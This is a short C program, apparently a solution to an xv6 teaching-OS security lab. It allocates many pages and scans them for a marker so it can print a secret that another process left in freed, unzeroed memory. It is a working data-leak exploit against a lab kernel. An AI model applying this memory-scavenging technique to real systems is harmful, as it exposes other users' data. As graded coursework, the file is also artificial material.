#include "kernel/types.h"
#include "kernel/fcntl.h"
#include "user/user.h"
#include "kernel/riscv.h"

#define ATTACK_PAGES 64
#define MARKER "This may help."
#define MARKER_SIZE 14
#define SECRET_OFFSET 16

int
main(int argc, char *argv[])
{
  char *memory;
  int total_size;
  int i;

  total_size = ATTACK_PAGES * PGSIZE;

  // 申请多个实际物理页面，尝试重新获得 secret 释放的页面。
  memory = sbrk(total_size);
  if(memory == SBRK_ERROR){
    exit(1);
  }

  // 扫描新分配的内存，查找 secret 程序留下的标记。
  for(i = 0; i <= total_size - SECRET_OFFSET - 1; i++){
    if(memcmp(memory + i, MARKER, MARKER_SIZE) == 0){
      // secret.c 将真正的秘密写在标记起始位置后 16 字节处。
      printf("%s\n", memory + i + SECRET_OFFSET);
      exit(0);
    }
  }

  exit(1);
}
